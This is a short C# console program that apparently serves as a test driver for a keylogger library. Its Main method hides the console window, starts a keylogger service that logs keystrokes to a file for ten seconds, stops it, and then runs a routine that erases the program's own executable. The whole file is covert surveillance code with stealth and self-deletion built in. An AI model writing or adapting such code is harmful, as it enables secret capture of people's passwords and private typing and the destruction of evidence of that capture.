using Custom.dotNet.EraseItself;
using KeyLogger.Library;
using KeyLogger.Library.Appenders;
using KeyLoggerLibrary.ConsoleTest.Helpers;
using System.Threading;

namespace KeyLoggerLibrary.ConsoleTest
{
    public class Program
    {
        private static int LIFETIME = 10000; //10 seconds
        static void Main(string[] args)
        {
            //Don´t needed, figure out changing output type to Windows Application
            ApplicationWindowHelper.HideConsoleWindow();

            IKeyLoggerService _service = new KeyLoggerService();

            _service.SetOutputMode = FileAppender.Instance;
            _service.Start();

            Thread.Sleep(LIFETIME);

            _service.Stop();

            _service = null;

            AutoEraseAssembly.ByCommandLine(System.Reflection.Assembly.GetExecutingAssembly().Location);
        }
    }
}
